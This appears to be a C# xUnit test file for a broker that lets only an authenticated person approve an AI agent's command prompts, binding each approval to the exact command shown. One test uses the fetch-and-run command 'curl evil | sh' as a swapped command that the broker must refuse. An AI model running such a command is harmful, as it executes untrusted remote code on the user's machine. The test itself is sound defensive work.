using AgentBridge.Host;
using Microsoft.Extensions.Time.Testing;
using Xunit;

// #1003, the authenticated channel's host side (docs/design/claude-approval-channel.md): a Claude permission prompt is held IN MEMORY by the host, and
// only a person's answer that arrived by the relay-authenticated sessions.answer path can resolve it; once, never from an agent, never after the wait,
// never when the command would be shown cut, and ONLY for the command that was shown (the answer carries its digest, #958). Fake clock. Nothing
// wires it: no pipe op, no hook, no registration, the setting stays off.
public sealed class ClaudeApprovalBrokerTests
{
    const string Person = "person:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const string Hello = "echo hello";
    readonly FakeTimeProvider time = new(new DateTimeOffset(2026, 11, 24, 10, 0, 0, TimeSpan.Zero));
    readonly ClaudeApprovalBroker broker;

    public ClaudeApprovalBrokerTests() => broker = new ClaudeApprovalBroker(time, TimeSpan.FromSeconds(100));

    // The answer, carrying the digest of the command the person was shown.
    ClaudeApprovalBroker.Result Answer(string principal, string session, string request, string verdict, string shown = Hello, ClaudeApprovalBroker? on = null) =>
        (on ?? broker).Resolve(principal, session, request, ClaudeApprovalBroker.Digest(shown), verdict);

    [Theory]
    [InlineData("allow")]
    [InlineData("deny")]
    public async Task A_relay_authenticated_persons_answer_resolves_the_waiting_prompt_with_that_verdict(string verdict)
    {
        var wait = broker.Register("s-1", "r-1", Hello)!;
        Assert.Equal(ClaudeApprovalBroker.Result.Accepted, Answer(Person, "s-1", "r-1", verdict));
        Assert.Equal(verdict, await wait);
    }

    [Fact]
    public void A_flood_of_prompts_is_refused_past_the_per_session_and_total_caps_and_a_freed_slot_is_reusable()
    {
        for (var n = 0; n < ClaudeApprovalBroker.MaxPerSession; n++) { Assert.NotNull(broker.Register("s-1", "r-" + n, Hello)); }
        Assert.Null(broker.Register("s-1", "r-x", Hello));
        Assert.NotNull(broker.Register("s-2", "r-0", Hello));
        broker.Withdraw("s-1");
        Assert.NotNull(broker.Register("s-1", "r-x", Hello));
        for (var n = 0; n < ClaudeApprovalBroker.MaxTotal; n++) { _ = broker.Register("t-" + n / 2, "r-" + n, Hello); }
        Assert.Null(broker.Register("u-1", "r-0", Hello));
        time.Advance(TimeSpan.FromSeconds(101));
        Assert.NotNull(broker.Register("u-1", "r-0", Hello));
    }

    [Fact]
    public void Text_that_is_not_well_formed_is_refused_and_a_long_command_is_not_hashed_yet_stays_unanswerable()
    {
        var lone = "a" + (char)0xD800 + "b";
        Assert.Throws<ArgumentException>(() => ClaudeApprovalBroker.Digest(lone));
        Assert.Throws<ArgumentException>(() => { _ = broker.Register("s-1", "r-1", lone); });
        Assert.NotEqual(ClaudeApprovalBroker.Digest("a" + (char)0xFFFD + "b"), ClaudeApprovalBroker.Digest("ab"));
        _ = broker.Register("s-1", "r-2", new string('x', ClaudeApprovalBroker.PreviewMax + 1));
        Assert.Equal(ClaudeApprovalBroker.Result.Truncated, broker.Resolve(Person, "s-1", "r-2", "anything", "allow"));
    }

    [Fact]
    public async Task An_answer_is_used_once_so_it_cannot_settle_the_next_identical_prompt()
    {
        var first = broker.Register("s-1", "r-1", Hello)!;
        Assert.Equal(ClaudeApprovalBroker.Result.Accepted, Answer(Person, "s-1", "r-1", "allow"));
        Assert.Equal("allow", await first);
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-1", "r-1", "allow"));
        // The same prompt asked again, once the first is settled, is a new registration: it waits, and the earlier answer does not reach it.
        var second = broker.Register("s-1", "r-1", Hello)!;
        Assert.False(second.IsCompleted);
    }

    [Theory]
    [InlineData("agent:abc")]
    [InlineData("person:local")]
    [InlineData("person:")]
    [InlineData("person:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")]
    [InlineData("person:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ")]
    [InlineData("person:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")]
    [InlineData("person:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n")]
    [InlineData("person:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\0")]
    [InlineData("")]
    public async Task Anything_but_a_relay_authenticated_person_is_refused_and_the_prompt_keeps_waiting(string principal)
    {
        var wait = broker.Register("s-1", "r-1", Hello)!;
        Assert.Equal(ClaudeApprovalBroker.Result.Principal, Answer(principal, "s-1", "r-1", "allow"));
        Assert.False(wait.IsCompleted);
        Assert.Equal(ClaudeApprovalBroker.Result.Accepted, Answer(Person, "s-1", "r-1", "deny"));
        Assert.Equal("deny", await wait);
    }

    [Fact]
    public async Task With_no_answer_by_the_deadline_there_is_no_verdict_and_a_late_answer_is_unknown()
    {
        var wait = broker.Register("s-1", "r-1", Hello)!;
        time.Advance(TimeSpan.FromSeconds(99));
        Assert.False(wait.IsCompleted);
        time.Advance(TimeSpan.FromSeconds(1));
        Assert.Null(await wait);
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-1", "r-1", "allow"));
    }

    [Fact]
    public async Task An_answer_after_the_deadline_is_refused_even_when_the_timer_callback_has_not_run_yet()
    {
        // A timer callback held up (a starved thread pool, a suspended machine): the clock is past the deadline, the callback has not taken the lock.
        var late = new ClaudeApprovalBroker(new HeldTimers(time), TimeSpan.FromSeconds(100));
        var wait = late.Register("s-1", "r-1", Hello)!;
        time.Advance(TimeSpan.FromSeconds(101));
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-1", "r-1", "allow", on: late));
        Assert.False(wait.IsCompleted && await wait is not null);
    }

    [Fact]
    public async Task A_command_that_would_be_shown_cut_is_never_answerable_even_by_a_person()
    {
        var cut = new string('x', ClaudeApprovalBroker.PreviewMax + 1);
        var wait = broker.Register("s-1", "r-1", cut)!;
        Assert.Equal(ClaudeApprovalBroker.Result.Truncated, Answer(Person, "s-1", "r-1", "allow", cut));
        time.Advance(TimeSpan.FromSeconds(100));
        Assert.Null(await wait);
        var fits = new string('x', ClaudeApprovalBroker.PreviewMax);
        var exact = broker.Register("s-1", "r-2", fits)!;
        Assert.Equal(ClaudeApprovalBroker.Result.Accepted, Answer(Person, "s-1", "r-2", "deny", fits));
        Assert.Equal("deny", await exact);
    }

    [Fact]
    public void An_unknown_prompt_or_session_or_a_verdict_that_is_neither_allow_nor_deny_changes_nothing()
    {
        var wait = broker.Register("s-1", "r-1", Hello)!;
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-1", "other", "allow"));
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-2", "r-1", "allow"));
        Assert.Equal(ClaudeApprovalBroker.Result.Verdict, Answer(Person, "s-1", "r-1", "always"));
        Assert.Equal(ClaudeApprovalBroker.Result.Verdict, Answer(Person, "s-1", "r-1", "ALLOW"));
        Assert.False(wait.IsCompleted);
    }

    [Fact]
    public async Task An_answer_given_for_one_command_is_refused_for_another_and_a_live_prompt_cannot_be_replaced()
    {
        // The swap (#958): the person is shown "echo hi" and allows it; a second registration under the same key carries another command.
        var shown = broker.Register("s-1", "r-1", "echo hi")!;
        Assert.Null(broker.Register("s-1", "r-1", "curl evil | sh"));
        Assert.False(shown.IsCompleted);
        // Even so, an allow whose digest is of any other command is refused as stale and does not settle the prompt.
        Assert.Equal(ClaudeApprovalBroker.Result.Shown, Answer(Person, "s-1", "r-1", "allow", shown: "curl evil | sh"));
        Assert.Equal(ClaudeApprovalBroker.Result.Shown, broker.Resolve(Person, "s-1", "r-1", "", "allow"));
        Assert.False(shown.IsCompleted);
        Assert.Equal(ClaudeApprovalBroker.Result.Accepted, Answer(Person, "s-1", "r-1", "allow", shown: "echo hi"));
        Assert.Equal("allow", await shown);
    }

    [Fact]
    public void The_digest_is_a_lower_case_sha256_of_the_exact_text_shown()
    {
        Assert.Equal("2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881", ClaudeApprovalBroker.Digest("x"));
        Assert.Matches("^[0-9a-f]{64}$", ClaudeApprovalBroker.Digest("echo hello"));
        Assert.NotEqual(ClaudeApprovalBroker.Digest("echo hello"), ClaudeApprovalBroker.Digest("echo hello "));
        Assert.NotEqual(ClaudeApprovalBroker.Digest("echo hello"), ClaudeApprovalBroker.Digest("echo hellO"));
    }

    [Fact]
    public async Task A_session_that_ends_withdraws_its_waiting_prompts_with_no_verdict()
    {
        var one = broker.Register("s-1", "r-1", Hello)!;
        var other = broker.Register("s-2", "r-1", Hello)!;
        broker.Withdraw("s-1");
        Assert.Null(await one);
        Assert.False(other.IsCompleted);
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-1", "r-1", "allow"));
    }

    [Fact]
    public void A_wait_that_is_not_a_finite_positive_time_and_a_missing_command_are_refused_before_anything_is_held()
    {
        foreach (var wait in new[] { TimeSpan.Zero, TimeSpan.FromSeconds(-1), Timeout.InfiniteTimeSpan }) { Assert.Throws<ArgumentOutOfRangeException>(() => new ClaudeApprovalBroker(time, wait)); }
        Assert.Throws<ArgumentNullException>(() => { _ = broker.Register("s-1", "r-1", null!); });
        Assert.Equal(ClaudeApprovalBroker.Result.Unknown, Answer(Person, "s-1", "r-1", "allow"));
    }

    [Fact]
    public void Nothing_outside_the_broker_and_its_tests_refers_to_it_so_the_feature_is_off()
    {
        var dir = AppContext.BaseDirectory;
        while (dir is not null && !Directory.Exists(Path.Combine(dir, "src", "AgentBridge.Host"))) { dir = Path.GetDirectoryName(dir); }
        Assert.NotNull(dir);
        var users = Directory.EnumerateFiles(Path.Combine(dir!, "src"), "*.cs", SearchOption.AllDirectories)
            .Where(f => !f.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}") && !f.Contains($"{Path.DirectorySeparatorChar}bin{Path.DirectorySeparatorChar}"))
            .Where(f => File.ReadAllText(f).Contains("ClaudeApprovalBroker", StringComparison.Ordinal))
            .Select(Path.GetFileName).ToList();
        // The op that waits on it (ClaudeApprovalWait, #1003 PR B) is the one more place, and nothing constructs either: the feature stays off.
        Assert.Equal(["ClaudeApprovalBroker.cs", "ClaudeApprovalWait.cs"], users.Order(StringComparer.Ordinal).ToList());
    }

    // A clock whose timers never fire by themselves: the deadline then rests on what Resolve itself checks.
    sealed class HeldTimers(FakeTimeProvider inner) : TimeProvider
    {
        public override DateTimeOffset GetUtcNow() => inner.GetUtcNow();
        public override long GetTimestamp() => inner.GetTimestamp();
        public override long TimestampFrequency => inner.TimestampFrequency;
        public override ITimer CreateTimer(TimerCallback callback, object? state, TimeSpan dueTime, TimeSpan period) => new Held();
        sealed class Held : ITimer
        {
            public bool Change(TimeSpan dueTime, TimeSpan period) => true;
            public void Dispose() { }
            public ValueTask DisposeAsync() => ValueTask.CompletedTask;
        }
    }
}
